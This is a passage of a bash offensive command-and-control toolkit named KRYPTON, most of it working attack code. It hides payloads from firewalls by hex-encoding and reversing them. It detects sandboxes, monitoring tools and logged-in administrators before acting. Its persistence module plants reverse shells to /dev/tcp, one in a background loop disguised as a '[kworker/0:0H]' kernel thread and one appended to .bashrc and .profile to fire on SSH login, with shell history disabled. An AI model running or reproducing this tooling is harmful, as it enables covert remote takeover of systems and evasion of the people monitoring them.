        echo "Timestamp: $(date)"
        echo "Original: $bash_payload"
        echo "Hex Encoded: $HEX_ENCODED"
        echo "Reversed: $REVERSED_HEX"
        echo "Final Obfuscated: $OBFUSCATED"
        echo ""
        echo "=== EXECUTION PAYLOADS ==="
        echo "Option 1 (printf + eval):"
        echo "$EXEC_PAYLOAD_1"
        echo ""
        echo "Option 2 (xxd + eval):"
        echo "$EXEC_PAYLOAD_2"
    } > /tmp/krypton_advanced_obfuscation.txt
    
    show_status "active" "Payloads saved to /tmp/krypton_advanced_obfuscation.txt"
    echo ""
    
    # Test decode locally (optional)
    echo -n "${BRIGHT_WHITE}Test decode locally? [y/N]: ${RESET}"
    read test_decode
    
    if [[ "$test_decode" =~ ^[Yy]$ ]]; then
        echo ""
        echo "${BRIGHT_WHITE}Decoding test...${RESET}"
        DECODED=$(echo "$OBFUSCATED" | sed 's/^.*\('"$RANDOM_PREFIX"'\)\(.*\)'"$RANDOM_SUFFIX"'.*$/\2/' | rev | xxd -r -p)
        echo "${BRIGHT_GREEN}Decoded: $DECODED${RESET}"
        echo ""
    fi
    
    echo "${BRIGHT_YELLOW}Firewall Analysis:${RESET}"
    echo "${BRIGHT_WHITE}The firewall will only see:${RESET}"
    echo "${BRIGHT_MAGENTA}$OBFUSCATED${RESET}"
    echo "${BRIGHT_WHITE}No 'bash', 'nc', '/dev/tcp' keywords visible${RESET}"
    echo ""
    
    read -p "Press Enter to continue..."
}

# Pre-Exploitation Audit module
pre_exploitation_audit() {
    echo ""
    show_status "info" "KRYPTON Pre-Exploitation Audit"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              ENVIRONMENT ANALYSIS${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    # Sandbox Detection
    echo "${BRIGHT_WHITE}[1] Sandbox Detection${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    SANDBOX_DETECTED=0
    SANDBOX_ARTIFACTS=()
    
    # Check using systemd-detect-virt
    if command -v systemd-detect-virt &> /dev/null; then
        VIRT_TYPE=$(systemd-detect-virt 2>/dev/null)
        if [ -n "$VIRT_TYPE" ] && [ "$VIRT_TYPE" != "none" ]; then
            SANDBOX_DETECTED=1
            SANDBOX_ARTIFACTS+=("systemd-detect-virt: $VIRT_TYPE")
        fi
    fi
    
    # Check lspci for virtualization hardware
    if command -v lspci &> /dev/null; then
        VMWARE=$(lspci 2>/dev/null | grep -i "vmware" || true)
        VIRTUALBOX=$(lspci 2>/dev/null | grep -i "virtualbox" || true)
        QEMU=$(lspci 2>/dev/null | grep -i "qemu" || true)
        
        if [ -n "$VMWARE" ]; then
            SANDBOX_DETECTED=1
            SANDBOX_ARTIFACTS+=("lspci: VMware detected")
        fi
        if [ -n "$VIRTUALBOX" ]; then
            SANDBOX_DETECTED=1
            SANDBOX_ARTIFACTS+=("lspci: VirtualBox detected")
        fi
        if [ -n "$QEMU" ]; then
            SANDBOX_DETECTED=1
            SANDBOX_ARTIFACTS+=("lspci: QEMU detected")
        fi
    fi
    
    # Check dmesg for virtualization artifacts
    if command -v dmesg &> /dev/null; then
        DMESG_VM=$(dmesg 2>/dev/null | grep -iE "(vmware|virtualbox|qemu|xen|hypervisor)" | head -5 || true)
        if [ -n "$DMESG_VM" ]; then
            SANDBOX_DETECTED=1
            SANDBOX_ARTIFACTS+=("dmesg: Virtualization artifacts found")
        fi
    fi
    
    # Check /proc/cpuinfo for hypervisor flags
    if [ -f /proc/cpuinfo ]; then
        HYPERVISOR=$(grep -i "hypervisor" /proc/cpuinfo 2>/dev/null || true)
        if [ -n "$HYPERVISOR" ]; then
            SANDBOX_DETECTED=1
            SANDBOX_ARTIFACTS+=("/proc/cpuinfo: Hypervisor flag detected")
        fi
    fi
    
    # Display sandbox detection results
    if [ $SANDBOX_DETECTED -eq 1 ]; then
        show_status "warning" "Sandbox/VM environment detected"
        echo ""
        echo "${BRIGHT_YELLOW}Artifacts found:${RESET}"
        for artifact in "${SANDBOX_ARTIFACTS[@]}"; do
            echo "  - $artifact"
        done
    else
        show_status "active" "No sandbox artifacts detected (likely bare metal)"
    fi
    echo ""
    
    # Writable Path Discovery
    echo "${BRIGHT_WHITE}[2] Writable Path Discovery${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    WRITABLE_PATHS=()
    CHECK_DIRS=("/dev/shm" "/var/tmp" "/tmp")
    
    for dir in "${CHECK_DIRS[@]}"; do
        if [ -d "$dir" ]; then
            PERMS=$(stat -c "%a" "$dir" 2>/dev/null || stat -f "%A" "$dir" 2>/dev/null)
            if [ "$PERMS" = "777" ] || [ "$PERMS" = "666" ] || [ "$PERMS" = "1777" ]; then
                WRITABLE_PATHS+=("$dir (permissions: $PERMS)")
            else
                WRITABLE_PATHS+=("$dir (permissions: $PERMS)")
            fi
        fi
    done
    
    # Check for other world-writable locations
    if command -v find &> /dev/null; then
        WORLD_WRITABLE=$(find / -perm -0002 -type d 2>/dev/null | head -10 || true)
        if [ -n "$WORLD_WRITABLE" ]; then
            echo "${BRIGHT_YELLOW}World-writable directories (top 10):${RESET}"
            echo "$WORLD_WRITABLE"
        fi
    fi
    
    echo ""
    echo "${BRIGHT_WHITE}Key directories permissions:${RESET}"
    for path in "${WRITABLE_PATHS[@]}"; do
        if [[ "$path" == *"777"* ]] || [[ "$path" == *"1777"* ]]; then
            echo -e "${BRIGHT_GREEN}[WRITABLE]${RESET} $path"
        else
            echo -e "${BRIGHT_WHITE}[READ-ONLY]${RESET} $path"
        fi
    done
    echo ""
    
    # Admin Presence Check
    echo "${BRIGHT_WHITE}[3] Admin Presence Check${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    # Check currently logged-in users
    echo "${BRIGHT_WHITE}Currently logged-in users:${RESET}"
    if command -v w &> /dev/null; then
        w 2>/dev/null || echo "Unable to retrieve user list"
    else
        who 2>/dev/null || echo "Unable to retrieve user list"
    fi
    echo ""
    
    # Check recent logins
    echo "${BRIGHT_WHITE}Recent logins (last 10):${RESET}"
    if command -v last &> /dev/null; then
        last -n 10 2>/dev/null || echo "Unable to retrieve login history"
    else
        echo "last command not available"
    fi
    echo ""
    
    # Check for active monitoring processes
    echo "${BRIGHT_WHITE}Active monitoring processes:${RESET}"
    MONITORING_PROCS=""
    
    # Check for common monitoring tools
    MONITORING_TOOLS=("strace" "tcpdump" "wireshark" "tshark" "ngrep" "ss" "lsof" "nmap" "tcpview" "ettercap")
    
    for tool in "${MONITORING_TOOLS[@]}"; do
        if pgrep -x "$tool" > /dev/null 2>&1; then
            MONITORING_PROCS="$MONITORING_PROCS$tool (running) "
        fi
    done
    
    # Check for system monitoring daemons
    if pgrep -x "syslog-ng" > /dev/null 2>&1; then
        MONITORING_PROCS="$MONITORING_PROCSsyslog-ng (running) "
    fi
    if pgrep -x "auditd" > /dev/null 2>&1; then
        MONITORING_PROCS="$MONITORING_PROCSauditd (running) "
    fi
    if pgrep -x "snort" > /dev/null 2>&1; then
        MONITORING_PROCS="$MONITORING_PROCSsnort (running) "
    fi
    
    if [ -n "$MONITORING_PROCS" ]; then
        show_status "warning" "Monitoring processes detected: $MONITORING_PROCS"
    else
        show_status "active" "No common monitoring processes detected"
    fi
    echo ""
    
    # Check for root/admin users
    echo "${BRIGHT_WHITE}Root/admin users:${RESET}"
    if command -v awk &> /dev/null; then
        ADMIN_USERS=$(awk -F: '$3 == 0 {print $1}' /etc/passwd 2>/dev/null)
        if [ -n "$ADMIN_USERS" ]; then
            echo -e "${BRIGHT_RED}UID 0 users: $ADMIN_USERS${RESET}"
        else
            echo "No UID 0 users found"
        fi
    fi
    echo ""
    
    # Save audit results
    {
        echo "=== KRYPTON PRE-EXPLOITATION AUDIT ==="
        echo "Timestamp: $(date)"
        echo ""
        echo "=== SANDBOX DETECTION ==="
        if [ $SANDBOX_DETECTED -eq 1 ]; then
            echo "Sandbox detected: YES"
            for artifact in "${SANDBOX_ARTIFACTS[@]}"; do
                echo "  - $artifact"
            done
        else
            echo "Sandbox detected: NO"
        fi
        echo ""
        echo "=== WRITABLE PATHS ==="
        for path in "${WRITABLE_PATHS[@]}"; do
            echo "$path"
        done
        echo ""
        echo "=== ADMIN PRESENCE ==="
        echo "Monitoring processes: $MONITORING_PROCS"
        echo "Root users: $ADMIN_USERS"
    } > /tmp/krypton_pre_audit.txt
    
    show_status "active" "Audit results saved to /tmp/krypton_pre_audit.txt"
    
    # Risk assessment
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BRIGHT_WHITE}RISK ASSESSMENT${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    
    RISK_LEVEL="LOW"
    RISK_FACTORS=()
    
    if [ $SANDBOX_DETECTED -eq 1 ]; then
        RISK_LEVEL="HIGH"
        RISK_FACTORS+=("Sandbox environment detected")
    fi
    
    if [ -n "$MONITORING_PROCS" ]; then
        RISK_LEVEL="HIGH"
        RISK_FACTORS+=("Active monitoring detected")
    fi
    
    for path in "${WRITABLE_PATHS[@]}"; do
        if [[ "$path" == *"777"* ]] || [[ "$path" == *"1777"* ]]; then
            RISK_LEVEL="MEDIUM"
            RISK_FACTORS+=("World-writable directories present")
        fi
    done
    
    if [ "$RISK_LEVEL" = "LOW" ]; then
        show_status "active" "Risk Level: LOW - Environment appears safe"
    elif [ "$RISK_LEVEL" = "MEDIUM" ]; then
        show_status "warning" "Risk Level: MEDIUM - Proceed with caution"
    else
        show_status "error" "Risk Level: HIGH - Aborting recommended"
    fi
    
    if [ ${#RISK_FACTORS[@]} -gt 0 ]; then
        echo ""
        echo "${BRIGHT_YELLOW}Risk factors:${RESET}"
        for factor in "${RISK_FACTORS[@]}"; do
            echo "  - $factor"
        done
    fi
    
    echo ""
    read -p "Press Enter to continue..."
}

# Memory-Resident Persistence module
memory_resident_persistence() {
    local target_host=""
    local target_port=""
    
    echo ""
    show_status "info" "KRYPTON Memory-Resident Persistence"
    echo ""
    
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BOLD}${BRIGHT_WHITE}              MEMORY-RESIDENT PERSISTENCE${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_YELLOW}This module creates memory-resident persistence that bypasses traditional detection${RESET}"
    echo "${BRIGHT_WHITE}• Background Bash loop (600s sleep cycle)${RESET}"
    echo "${BRIGHT_WHITE}• Environment variable hijack (.bashrc/.profile)${RESET}"
    echo "${BRIGHT_WHITE}• Stealth naming: [kworker/0:0H] kernel thread masquerading${RESET}"
    echo ""
    
    # Get target connection info
    if [ -f /tmp/krypton_tunnel_info.txt ]; then
        TUNNEL_INFO=$(cat /tmp/krypton_tunnel_info.txt)
        AUTO_HOST=$(echo $TUNNEL_INFO | cut -d: -f1 | sed 's/tcp:\/\///')
        AUTO_PORT=$(echo $TUNNEL_INFO | cut -d: -f2)
        
        echo "${BRIGHT_YELLOW}Active tunnel detected: $AUTO_HOST:$AUTO_PORT${RESET}"
        echo -n "${BRIGHT_WHITE}Use this tunnel? [Y/n]: ${RESET}"
        read use_auto
        
        if [[ "$use_auto" =~ ^[Yy]$ ]] || [ -z "$use_auto" ]; then
            target_host=$AUTO_HOST
            target_port=$AUTO_PORT
        fi
    fi
    
    if [ -z "$target_host" ]; then
        echo -n "${BRIGHT_WHITE}Enter target host: ${RESET}"
        read target_host
        echo -n "${BRIGHT_WHITE}Enter target port: ${RESET}"
        read target_port
    fi
    
    echo ""
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo "${BRIGHT_WHITE}              PERSISTENCE OPTIONS${RESET}"
    echo "${BOLD}${BRIGHT_CYAN}═══════════════════════════════════════════════════════════════${RESET}"
    echo ""
    echo "${BRIGHT_WHITE}[1]${RESET} Background Bash Loop (600s cycle)"
    echo "${BRIGHT_WHITE}[2]${RESET} Environment Variable Hijack (.bashrc/.profile)"
    echo "${BRIGHT_WHITE}[3]${RESET} Deploy All Memory-Resident Methods"
    echo "${BRIGHT_WHITE}[0]${RESET} Back to Main Menu"
    echo ""
    echo -n "${BOLD}${BRIGHT_WHITE}Select option [0-3]: ${RESET}"
    read persist_choice
    
    case $persist_choice in
        1)
            # Background Bash Loop
            echo ""
            show_status "info" "Background Bash Loop Persistence"
            echo ""
            
            # Generate the persistence script
            PERSIST_SCRIPT="/tmp/krypton_persist_loop.sh"
            
            cat > "$PERSIST_SCRIPT" << 'EOF'
#!/bin/bash
# KRYPTON Memory-Resident Persistence
# Stealth naming: [kworker/0:0H]

# Rename process to blend with kernel threads
exec -a "[kworker/0:0H]" bash "$0" "$@" &
exit

# Main persistence loop
while true; do
    sleep 600
    # Trigger reverse shell connection
    bash -c 'unset HISTFILE; bash -i >& /dev/tcp/HOST/PORT 0>&1' 2>/dev/null
done
EOF
            
            # Replace HOST and PORT placeholders
            sed -i "s/HOST/$target_host/g" "$PERSIST_SCRIPT"
            sed -i "s/PORT/$target_port/g" "$PERSIST_SCRIPT"
            
            chmod +x "$PERSIST_SCRIPT"
            
            echo "${BRIGHT_WHITE}Generated persistence script:${RESET}"
            echo "${BRIGHT_GREEN}$PERSIST_SCRIPT${RESET}"
            echo ""
            
            echo "${BRIGHT_WHITE}Script content:${RESET}"
            cat "$PERSIST_SCRIPT"
            echo ""
            
            # Start the persistence process
            echo -n "${BRIGHT_WHITE}Start persistence process now? [y/N]: ${RESET}"
            read start_now
            
            if [[ "$start_now" =~ ^[Yy]$ ]]; then
                nohup "$PERSIST_SCRIPT" > /dev/null 2>&1 &
                PERSIST_PID=$!
                echo "$PERSIST_PID" > /tmp/krypton_persist_pid.txt
                show_status "active" "Persistence process started (PID: $PERSIST_PID)"
                echo "${BRIGHT_WHITE}Process name in ps: [kworker/0:0H]${RESET}"
            else
                show_status "info" "Script saved but not started. Execute manually:"
                echo "${BRIGHT_GREEN}nohup $PERSIST_SCRIPT > /dev/null 2>&1 &${RESET}"
            fi
            ;;
            
        2)
            # Environment Variable Hijack
            echo ""
            show_status "info" "Environment Variable Hijack"
            echo ""
            
            # Generate the trigger code
            TRIGGER_CODE='
# KRYPTON SSH Trigger - Only executes on SSH login
if [ -n "$SSH_CONNECTION" ]; then
    # Stealth reverse shell trigger
    bash -c "unset HISTFILE; bash -i >& /dev/tcp/HOST/PORT 0>&1" 2>/dev/null &
fi'
            
            # Replace HOST and PORT placeholders
            TRIGGER_CODE=$(echo "$TRIGGER_CODE" | sed "s/HOST/$target_host/g")
            TRIGGER_CODE=$(echo "$TRIGGER_CODE" | sed "s/PORT/$target_port/g")
            
            echo "${BRIGHT_WHITE}Trigger code:${RESET}"
            echo "${BRIGHT_GREEN}$TRIGGER_CODE${RESET}"
            echo ""
            
            # Target shell config files
            CONFIG_FILES=("$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile" "$HOME/.zshrc")
            
            for config in "${CONFIG_FILES[@]}"; do
                if [ -f "$config" ]; then
                    echo -n "${BRIGHT_WHITE}Append to $config? [y/N]: ${RESET}"
                    read append_confirm
                    
                    if [[ "$append_confirm" =~ ^[Yy]$ ]]; then
                        # Check if already present
                        if grep -q "KRYPTON SSH Trigger" "$config" 2>/dev/null; then
                            echo "${BRIGHT_YELLOW}Trigger already present in $config${RESET}"
                        else
                            echo "$TRIGGER_CODE" >> "$config"
                            show_status "active" "Trigger appended to $config"
                        fi
                    fi
                fi
            done
            
            echo ""
            show_status "info" "Trigger will execute on next SSH login"
            ;;
            
        3)
            # Deploy All Methods
            echo ""
            show_status "info" "Deploying All Memory-Resident Persistence"
            echo ""
            
            echo -n "${BRIGHT_WHITE}Deploy all methods? [y/N]: ${RESET}"
            read deploy_all
            
            if [[ "$deploy_all" =~ ^[Yy]$ ]]; then
                # Background Loop
                PERSIST_SCRIPT="/tmp/krypton_persist_loop.sh"
                cat > "$PERSIST_SCRIPT" << 'EOF'
#!/bin/bash
exec -a "[kworker/0:0H]" bash "$0" "$@" &
exit
while true; do
    sleep 600
    bash -c 'unset HISTFILE; bash -i >& /dev/tcp/HOST/PORT 0>&1' 2>/dev/null
done
EOF
                sed -i "s/HOST/$target_host/g" "$PERSIST_SCRIPT"
                sed -i "s/PORT/$target_port/g" "$PERSIST_SCRIPT"
                chmod +x "$PERSIST_SCRIPT"
                nohup "$PERSIST_SCRIPT" > /dev/null 2>&1 &
                PERSIST_PID=$!
                echo "$PERSIST_PID" > /tmp/krypton_persist_pid.txt
                show_status "active" "Background loop deployed (PID: $PERSIST_PID)"
                
                # Environment Variable Hijack
                TRIGGER_CODE='
if [ -n "$SSH_CONNECTION" ]; then
    bash -c "unset HISTFILE; bash -i >& /dev/tcp/HOST/PORT 0>&1" 2>/dev/null &
fi'
                TRIGGER_CODE=$(echo "$TRIGGER_CODE" | sed "s/HOST/$target_host/g")
                TRIGGER_CODE=$(echo "$TRIGGER_CODE" | sed "s/PORT/$target_port/g")
                
                for config in "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.profile"; do
                    if [ -f "$config" ] && ! grep -q "KRYPTON SSH Trigger" "$config" 2>/dev/null; then
                        echo "$TRIGGER_CODE" >> "$config"
                    fi
                done
                show_status "active" "Environment trigger deployed"
                
                echo ""
                show_status "active" "All memory-resident persistence deployed"
            else
                show_status "warning" "Deployment cancelled"
            fi
            ;;
            
        0)
            return 0
            ;;
            
        *)
            show_status "error" "Invalid option"
            ;;
    esac
    
    echo ""
    echo "${BRIGHT_YELLOW}Stealth Naming Verification:${RESET}"
    echo "${BRIGHT_WHITE}Check process list with: ps aux | grep kworker${RESET}"
    echo "${BRIGHT_WHITE}The persistence will appear as: [kworker/0:0H]${RESET}"
    echo ""
    
    # Save deployment info
    {
        echo "=== KRYPTON MEMORY-RESIDENT PERSISTENCE ==="
        echo "Timestamp: $(date)"
        echo "Target: $target_host:$target_port"
        echo "Method: Option $persist_choice"
        echo ""
        echo "=== DEPLOYMENT INFO ==="
        echo "Process PID: $(cat /tmp/krypton_persist_pid.txt 2>/dev/null || echo 'Not started')"
        echo "Stealth name: [kworker/0:0H]"
    } > /tmp/krypton_memory_persist.txt
    
    show_status "info" "Deployment info saved to /tmp/krypton_memory_persist.txt"
    
    echo ""
    read -p "Press Enter to continue..."
}

# Full C2 startup
start_full_c2() {
    echo ""
    show_status "info" "Starting Full C2 Setup..."
    echo ""
    
    # Start ngrok
    start_ngrok_tunnel
    
    # Start listener
    echo ""
    show_status "info" "Starting listener..."
    start_listener
}

# Main function
main() {
    while true; do
        show_banner
        show_menu
        echo -n "${BOLD}${BRIGHT_WHITE}Select option [0-15]: ${RESET}"
        read choice
        
        case $choice in
            1)
                start_ngrok_tunnel
                ;;
            2)
                start_listener
                ;;
            3)
                start_full_c2
                ;;
            4)
                show_tunnel_status
                ;;
            5)
                stop_ngrok_tunnel
                ;;
            6)
                generate_payload
                ;;
            7)
                generate_obfuscated_payload
                ;;
            8)
                generate_stabilization_script
                ;;
            9)
                exfiltration_module
                ;;
            10)
                persistence_module
                ;;
            11)
                network_pivoting_module
                ;;
            12)
                multi_channel_exfiltration
                ;;
            13)
                advanced_obfuscation_engine
                ;;
            14)
                pre_exploitation_audit
                ;;
            15)
                memory_resident_persistence
                ;;
            0)
                clear_screen
                echo "${BOLD}${BRIGHT_GREEN}Goodbye!${RESET}"
                echo ""
                exit 0
                ;;
            *)
                show_status "error" "Invalid option. Please try again."
                sleep 2
                ;;
        esac
    done
}

# Run main function
main
